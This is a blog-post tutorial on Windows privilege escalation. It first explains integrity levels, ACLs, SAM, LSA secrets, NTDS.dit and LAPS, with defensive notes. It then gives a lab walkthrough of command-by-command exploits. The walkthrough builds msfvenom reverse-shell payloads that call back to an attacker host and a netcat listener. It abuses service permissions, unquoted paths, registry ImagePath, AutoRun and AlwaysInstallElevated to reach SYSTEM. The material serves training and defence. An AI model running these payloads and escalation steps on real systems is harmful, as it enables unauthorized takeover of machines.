---
layout: post
title: "Windows PrivEsc Part 1: From Basics to Exploits"
date: 2025-09-23
categories: [Red Team,Windows Privilege Escalation,Malware Development,Blue Team,Cybersecurity]
image: https://cdn-images-1.medium.com/max/800/1*15gFAZAWtcufSSqBVCBpCg.jpeg
---

## **What Is Integrity Level?**

Integrity Level (IL) is a **security mechanism in Windows** that controls how processes, objects (files, registry keys, etc.), and users interact with each other.

Think of it as a **trust ranking system** that tells Windows:

“How trusted is this process or object? Should it be allowed to interact with others?”

This is part of **Mandatory Integrity Control (MIC)** introduced in **Windows Vista** as an enhancement to security.  
Even if a user has permissions to access a resource, Windows still checks whether their process integrity level is high enough to modify that resource.

## **Integrity Levels Overview**

Here’s the hierarchy from lowest to highest:

| **Integrity Level** | **SID (Security Identifier)** | **Purpose / Use Case** | **Examples** |
| --- | --- | --- | --- |
| **Untrusted** | S-1-16-0 | Almost no privileges. Used for completely untrusted code or anonymous users. | Anonymous network logon, sandboxed processes |
| **Low** | S-1-16-4096 | Limited access to objects. Cannot modify most files except in locations like Internet cache. | Internet Explorer in Protected Mode, Edge sandboxed tabs |
| **Medium** | S-1-16-8192 | Default for standard users. Can modify user-owned files and registry keys but not system-protected areas. | Normal user processes (**Explorer.exe, Notepad.exe**) |
| **High** | S-1-16-12288 | Processes running as administrator (with UAC elevated token). Can modify system files. | **Elevated cmd.exe, PowerShel**l (Run as Administrator) |
| **System** | S-1-16-16384 | Trusted OS-level processes. Has full control over system resources. | **winlogon.exe, services.exe, lsass.exe** |
| **Installer** | S-1-16-40960 | Special level used by Windows Installer service (**MSIExec**). Temporarily grants elevated rights to install software. | **msiexec.exe** installing software |

## **Detailed Breakdown**

### 1️. U**ntrusted Integrity Level**

- **Purpose:** Used for completely isolated, sandboxed code.
- **Rights:** Minimal access, cannot write to most locations on disk or registry.
- **Example:**
  - A process launched from an untrusted source (e.g., downloaded file with "Mark of the Web" flagged as unsafe).
  - Anonymous network logon sessions.
- **Security Benefit:** Prevents malicious code from affecting system/user data even if it runs.

### 2️. **Low Integrity Level**

- **Purpose:** Runs code that needs to interact with risky input (like the internet) but shouldn’t be able to modify user/system data.
- **Rights:**
  - Can read most objects that the user can read.
  - Can only write to low-integrity locations (like **AppData\\LocalLow**).
- **Example:**
  - Internet Explorer Protected Mode tabs.
  - Microsoft Edge browser renderer process.
- **Security Benefit:** If a browser is exploited, attacker code stays isolated and can’t overwrite important files or registry keys.

### 3️. **Medium Integrity Level**

- **Purpose:** Default level for standard user processes.
- **Rights:** Can read/write anything the user owns.
- **Example:**
  - Explorer.exe
  - Notepad.exe
  - cmd.exe (without admin privileges)
- **Security Benefit:** Prevents standard user apps from tampering with higher-integrity (admin) objects.

### 4️. **High Integrity Level**

- **Purpose:** Represents an elevated process running with Administrator privileges (after UAC prompt approval).
- **Rights:** Full access to most of the system.
- **Example:**
  - Elevated Command Prompt
  - Registry Editor (Run as Administrator)
- **Security Benefit:** Segregates privileged operations from normal apps, requiring UAC consent.

### 5️. **System Integrity Level**

- **Purpose:** Reserved for core Windows processes.
- **Rights:** Highest privileges short of kernel-mode code.
- **Example:**
  - winlogon.exe (responsible for user logon)
  - services.exe
  - lsass.exe
- **Security Benefit:** Prevents even admin processes from interfering with sensitive OS services unless explicitly allowed.

### 6️. I**nstaller Integrity Level**

- **Purpose:** Special level used when installing software, allowing temporary write access to secure locations without fully elevating to SYSTEM.
- **Example:**
  - **msiexec.exe** during installation.
- **Security Benefit:** Grants just enough privilege for installation while keeping least-privilege principle.

## How to Check Integrity levels

You can check process integrity levels in several ways:

### Using **Task Manager**

1. Open Task Manager → Details tab
2. Right-click column header → Select Columns → Check "Integrity Level"

### Using **Command Line**

**whoami /groups**

This shows the integrity level of your current process under "Mandatory Label...".

### Using PowerShell

**Get-Process -Id $PID | Select-Object -Property ProcessName, @{Name="IntegrityLevel";Expression={(Get-Acl $\_.Path).AccessToString**

# What ACLs are (short conceptual)

- **ACL (Access Control List)** — a list attached to an NT object (file, folder, registry key, service, COM object, etc.) that controls access.
- An ACL contains **ACEs (Access Control Entries)**. Each ACE is either a grant or deny (or audit entry) and names a principal (user/group/ SID) and a set of permissions.
- Windows uses two important ACL flavors:
  - **DACL (Discretionary ACL)** — controls who can or cannot access the object. If a DACL is missing, the object is wide open.
  - **SACL (System ACL)** — controls auditing — which access attempts get logged in the Security event log.

# DACL (Discretionary ACL) — how it works

- The DACL is consulted when a subject (process, user) tries to access an object.
- Windows evaluates ACEs in order until a decision is reached (deny ACEs are evaluated before allow ACEs of the same principal).
- ACE can be:
  - **Allow ACE** — permits operations (read/write/execute etc.)
  - **Deny ACE** — refuses operations (stronger than allow)
  - **Special ACEs** — e.g., Take ownership, Change permissions (WRITE_DAC), **Read control** (READ_CONTROL)
- Important special permissions that matter for privilege escalation:
  - **WRITE_DAC** — change ACLs (allows altering who can access)
  - **WRITE_OWNER** — change object owner (can later grant self permissions)
  - **GENERIC_ALL / FullControl** — full rights (create, delete, modify, change permissions)
  - **GENERIC_WRITE** and **GENERIC_EXECUTE** — typical app-level rights
- If an attacker can get **WRITE_DAC** or **WRITE_OWNER** on a protected object (service binary, scheduled task, service registry key), they can often escalate.

# SACL (System ACL) — auditing

- SACL contains ACEs that say “audit this type of access by these principals”.
- When a matching access happens, Windows logs an event to the **Security** event log (Event Viewer → Windows Logs → Security).
- SACL ACEs include flags for success/failure auditing.
- Useful for defenders: configure SACLs to log risky operations (e.g., changes to service binaries or scheduled tasks).

# icacls.exe — quick reference & examples

**icacls** is the common CLI tool for viewing and modifying ACLs on files/folders.

View ACL of a file/folder:

**icacls C:\\path\\to\\file.txt**

Sample output:

**C:\\path\\to\\file.txt NT AUTHORITY\\SYSTEM:(I)(F)**

**BUILTIN\\Administrators:(I)(F)**

**MYDOMAIN\\Alice:(I)(M)**

Explaination:

- (I) means **inherited** (ACE was inherited from parent).
- (F) = **Full control**.
- (M) = **Modify**.

Useful flags and commands:

- **icacls &lt;path&gt;** — show ACL
- **icacls &lt;path&gt; /save aclfile /**t — save ACLs for multiple files (useful for backups)
- **icacls &lt;path&gt; /grant User:(R,W,M,F)** — grant rights (R=read, W=write, M=modify, F=full)
- **icacls &lt;path&gt; /deny User:(D)** — deny (use sparingly — denies are evaluated early)
- **icacls &lt;path&gt; /remove:g User** — remove granted ACE
- **icacls &lt;path&gt; /setowner &lt;user&gt;** — change owner (requires rights)
- **icacls &lt;path&gt; /inheritance:e|d|r** — enable/disable/reset inheritance

Mapping common symbolic rights you’ll see with icacls:

- F = Full control (GENERIC_ALL)
- M = Modify
- RX = Read & execute
- R = Read
- W = Write
- D = Delete (sometimes appears in special contexts)
- CI = Container Inherit (applies to subfolders)
- OI = Object Inherit (applies to files)

# DACL vs SACL: practical differences (summary)

- **DACL** = access control (who can do what). If empty/null — object is accessible to everyone.
- **SACL** = auditing (what to log about accesses). Used by defenders; attackers may try to disable SACLs or alter audit settings to hide traces.

# Common ACL misconfigurations abused for privilege escalation

1. **Service binary writable by non-admins**
    - Why dangerous: attacker can replace binary executed by SYSTEM service -> code runs as SYSTEM.
    - Detect: check service ImagePath ACLs and file permissions (**icacls** on the binary) and registry keys (**HKLM\\SYSTEM\\CurrentControlSet\\Services\\&lt;svc&gt;** ACLs).
2. **Writable service registry keys**
    - Why: attacker can change **ImagePath** or other parameters to point to malicious payload.
    - Detect: **Get-Acl** on service registry key or use tools enumerating service permissions.
3. **Weak scheduled task permissions**
    - Why: attacker can change task action to run a malicious binary under SYSTEM.
    - Detect: check task XML or use **schtasks /query /xml** and ACL on **C:\\Windows\\System32\\Tasks**.
4. **WORLD/Everyone write permissions on sensitive folders**
    - Why: allows replacing DLLs, executables, configs.
    - Detect: **icacls C:\\path** and look for **Everyone:(W) or Users:**(M) on system folders.
5. **Writable service point in COM/registry for COM object hijack**
    - Why: if non-admins can register or replace COM objects, they can escalate.
6. **Delegated ownership / WRITE_OWNER allowed**
    - Why: attackers change owner then give themselves rights.
    - Detect: look for **WRITE_OWNER** in ACEs (tools or SDDL).
7. **Misconfigured share permissions plus NTFS permissions mismatch**
    - Why: Share-level full control + NTFS restricts may look okay but combined effect can permit abuse.
    - Detect: check both share permissions and **icacls**.

# SAM (Security Accounts Manager)

**What it is**  
The SAM is the local account database on a Windows machine that stores user account information for local (non-domain) accounts. It contains account metadata and the hashed forms of local account passwords.

**Where it lives**

- On disk: the SAM registry hive file at **C:\\Windows\\System32\\config\\SAM.**
- The SAM hive is normally only accessible to the **SYSTEM** account while the OS is running (the file is locked).

**What it contains**

- Local user records (names, RIDs, account flags).
- Password verifier data — stored as hashed credentials (historically LANMAN + NTLM hashes; modern Windows stores just the NT hash by default unless LM is enabled).
- Additional associated keys and secrets are in the **SYSTEM** hive (the SAM uses a system key stored under **HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\** to encrypt parts of the SAM).

**Why attackers care**

- Local account hashes can be used for offline cracking or for lateral authentication reuse (pass-the-hash style techniques against older protocols).
- If an adversary obtains the SAM (e.g., from an offline image or backup), they can extract the hashes and attempt to escalate or move laterally.

**Defensive notes**

- SAM is protected by OS-level file locks and ACLs; protect backups and shadow copies because those can leak the SAM.
- Disable unnecessary local accounts, enforce strong passwords, remove LM hashes, and apply least-privilege to backup/administrative groups.
- Use Windows features like Credential Guard (where appropriate) to reduce exposure of secrets.

# LSA (Local Security Authority) & LSA Secrets

**What it is**  
The LSA subsystem enforces security policy on Windows and is responsible for local authentication and storing certain sensitive secrets. The running process **lsass.exe** (LSA Subsystem Service) also holds credential material in memory.

**Where secrets live**

- **LSA Secrets (persisted):** stored in the registry under **HKLM\\SECURITY\\Policy\\Secrets** (this hive is accessible only to SYSTEM and heavily protected). Those secrets include service account passwords, some cached secrets, and other sensitive keys used by system components.
- **LSASS memory (runtime):** contains in-memory credential material — Kerberos tickets, cached domain credentials, plain/text or hashed credentials used by processes — depending on configuration and Windows version.

**What it contains**

- Service and system secrets (persisted).
- At runtime, authentication tokens, Kerberos keys and tickets, cached credentials, and other authentication artifacts.

**Why attackers care**

- Access to LSA Secrets or LSASS memory can reveal plaintext credentials, service account passwords, Kerberos keys, or ticket material that enables lateral movement or privilege escalation.
- Because LSASS runs as SYSTEM and acts as the authentication authority, compromising its secrets yields powerful credentials.

**Defensive notes**

- Enable LSA protections: **LSA Protection (RunAsPPL)** and **Credential Guard** reduce the risk of process memory reads and credential theft.
- Minimize service accounts with high privileges and avoid storing plaintext secrets in services where possible.
- Protect access to the **HKLM\\SYSTEM** and **HKLM\\SECURITY** hives and to backups.
- Monitor and alert on suspicious actions that target **lsass.exe** (debugging, process injection, creation of memory dumps), and on creation/access of system backup artifacts.

# NTDS.dit (Active Directory database)

**What it is**  
**NTDS.dit** is the Extensible Storage Engine (ESE) database file that stores the Active Directory directory partition data on a Domain Controller (DC). It is the canonical AD database.

**Where it lives**

- Default path on a DC**: C:\\Windows\\NTDS\\NTDS.dit** (and related ESE log files and checkpoints in the same folder).
- The file is owned and protected; while the DC is running the file is locked and only accessible to SYSTEM.

**What it contains**

- All AD objects: users, groups, computer objects, group memberships, GPO metadata, schema objects, etc.
- Crucially, user credential material: AD stores password-related data for user/computer accounts — NTLM password hashes and Kerberos key material (Kerberos keys for supported algorithms such as AES variants, RC4/HMAC if used).
- AD also contains attributes like **msDS-ManagedBy, adminCount**, and many attributes useful to enumerators.

**Why attackers care**

- **NTDS**.**dit** contains the domain account hashes and key material needed to impersonate accounts, obtain domain long-lived credentials, or craft Kerberos tickets. A full copy of **NTDS.dit** (plus the SYSTEM hive that holds encryption keys) allows an offline extraction of password hashes for all domain accounts, enabling domain compromise.
- Even partial access — such as using DRS/RPC replication (DCSync) — can allow an attacker to obtain credential material without touching the file directly.

**Defensive notes**

- Limit who can perform AD replication and who has high privileged roles (monitor and restrict **Replicating Directory Changes** rights).
- Protect physical and backup access to domain controllers; encrypt backups and restrict keys.
- Use enhanced auditing on sensitive DC operations and monitor for replication-style anomalies or unexpected read operations (e.g., suspicious use of privileged domain accounts).
- Consider Azure AD/Hybrid protections and tiered admin models to reduce risk of full domain compromise.

# LAPS (Local Administrator Password Solution)

**What it is**  
LAPS is a Microsoft solution that manages local Administrator account passwords on domain-joined machines by automatically generating unique, random passwords per computer and storing them in Active Directory.

**How it works (high level)**

- A Group Policy Client Side Extension on domain-joined endpoints generates a new random local Administrator password on a schedule and writes it into a **domain attribute** for that computer object (commonly **ms-Mcs-AdmPwd**) with an associated expiration attribute (e.g., **ms-Mcs-AdmPwdExpirationTime**).
- Only principals with the appropriate read permissions on that attribute can retrieve the password. Delegation controls who can read passwords (e.g., helpdesk accounts).

**Why defenders like it**

- It eliminates password reuse for the local Administrator account and avoids shared local admin creds across many hosts — reducing the “single credential to rule them all” problem.

**Why attackers care (and common misconfigurations)**

- If the ACL on the **ms-Mcs-AdmPwd** attribute is too permissive, an attacker who can read that attribute can obtain local admin credentials for many machines — an easy path for lateral movement.
- Admins sometimes delegate read rights too broadly (e.g., to Domain Users) or fail to rotate permissions when roles change.
- Backups or AD replication rights that expose the attribute can be another avenue.

**Defensive notes / hardening**

- Enforce strict ACLs on the LAPS AD attributes. Grant read rights only to necessary admin/service accounts.
- Use AD delegation models and tiered admin models (protect accounts that can read LAPS attributes).
- Monitor read access to computer object attributes if possible and audit changes to the ms-Mcs-AdmPwd attribute.
- Ensure GPO and client CSE are properly configured and that passwords are being rotated as intended.

## **Information Gathering**

### **User Enumeration**

Current user’s privileges: **whoami /priv**

List users: **net users**

List details of a user: **net user username** (e.g. net user Administrator)

Other users logged in simultaneously: **qwinsta** (the query session command can be used the same way)

User groups defined on the system: **net localgroup**

List members of a specific group: **net localgroup groupname** (e.g. net localgroup Administrators)

### **Collecting system information**

The systeminfo command will return an overview of the target system. On some targets, the amount of data returned by this command can be overwhelming, so you can always grep the output as seen below:

**systeminfo | findstr /B /C:"OS Name" /C:"OS Version"**

### **Patch level**

Microsoft regularly releases updates and patches for Windows systems. A missing critical patch on the target system can be an easily exploitable ticket to privilege escalation. The command below can be used to list updates installed on the target system.

**wmic qfe get Capt0ion,Description,HotFixID,InstalledOn**

### **Antivirus**

The first approach may require some research beforehand to learn more about service names used by the antivirus software. For example, the default antivirus installed on Windows systems, Windows Defender’s service name is windefend. The query below will search for a service named “windefend” and return its current state.

**sc query windefend**

### **Practical Examples**

**Let’s Hacking**

#### **Generate a Reverse Shell Executable**

On Kali, generate a reverse shell executable (reverse.exe) using msfvenom. Update the LHOST IP address accordingly:

**msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe**

Transfer the reverse.exe file to the C:\\PrivEsc directory on Windows. There are many ways you could do this, however the simplest is to start an SMB server on Kali in the same directory as the file, and then use the standard Windows copy command to transfer the file.

On Kali, in the same directory as reverse.exe:

**sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali** .

On Windows (update the IP address with your Kali IP):

**copy \\\\10.10.10.10\\kali\\reverse.exe C:\\PrivEsc\\reverse.exe**

Test the reverse shell by setting up a netcat listener on Kali:

**sudo nc -nvlp 53**

Then run the reverse.exe executable on Windows and catch the shell:

**C:\\PrivEsc\\reverse.exe**

#### **Service Exploits - Insecure Service Permissions**

Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:

**C:\\PrivEsc\\accesschk.exe /accepteula -uwcqv user daclsvc**

Note that the "user" account has the permission to change the service config (SERVICE_CHANGE_CONFIG).

Query the service and note that it runs with **SYSTEM** privileges (SERVICE_START_NAME):

**sc qc daclsvc**

Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:

**sc config daclsvc binpath= "\\"C:\\PrivEsc\\reverse.exe\\""**

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

**net start daclsvc**

#### **Service Exploits - Unquoted Service Path**

Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME) and that the BINARY_PATH_NAME is unquoted and contains spaces.

**wmic service get name,displayname,pathname,startmode**

**sc qc unquotedsvc**

Using accesschk.exe, note that the BUILTIN\\Users group is allowed to write to the C:\\Program Files\\Unquoted Path Service\\ directory:

**C:\\PrivEsc\\accesschk.exe /accepteula -uwdq "C:\\Program Files\\Unquoted Path Service\\"**

Copy the reverse.exe executable you created to this directory and rename it Common.exe:

**copy C:\\PrivEsc\\reverse.exe "C:\\Program Files\\Unquoted Path Service\\Common.exe"**

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

**net start unquotedsvc**

#### **Service Exploits - Weak Registry Permissions**

Query the "regsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).

**sc qc regsvc**

Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\\INTERACTIVE" group (essentially all logged-on users):

**C:\\PrivEsc\\accesschk.exe /accepteula -uvwqk HKLM\\System\\CurrentControlSet\\Services\\regsvc**

Overwrite the ImagePath registry key to point to the reverse.exe executable you created:

**reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\\PrivEsc\\reverse.exe /f**

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

**net start regsvc**

#### **Service Exploits - Insecure Service Executables**

Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).

**sc qc filepermsvc**

Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:

**C:\\PrivEsc\\accesschk.exe /accepteula -quvw "C:\\Program Files\\File Permissions Service\\filepermservice.exe"**

Copy the reverse.exe executable you created and replace the filepermservice.exe with it:

**copy C:\\PrivEsc\\reverse.exe "C:\\Program Files\\File Permissions Service\\filepermservice.exe" /Y**

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

**net start filepermsvc**

### **DLL Hijacking**

• If DLLs are missing or writeable, we can execute code  
• Automatic enumeration: Crassus.exe  
(<https://github.com/vu-ls/Crassus>)

#### **Registry – AutoRuns**

Query the registry for AutoRun executables:

**reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run**

Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:

**C:\\PrivEsc\\accesschk.exe /accepteula -wvu "C:\\Program Files\\Autorun Program\\program.exe"**

Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:

**copy C:\\PrivEsc\\reverse.exe "C:\\Program Files\\Autorun Program\\program.exe" /Y**

Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!

**rdesktop 10.10.13.0**

#### **Registry – AlwaysInstallElevated**

Query the registry for AlwaysInstallElevated keys:

**reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated**
**reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated**

Note that both keys are set to 1 (0x1).

On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:

**msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi**

Transfer the reverse.msi file to the C:\\PrivEsc directory on Windows (use the SMB server method from earlier).

Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:

**msiexec /quiet /qn /i C:\\PrivEsc\\reverse.msi**
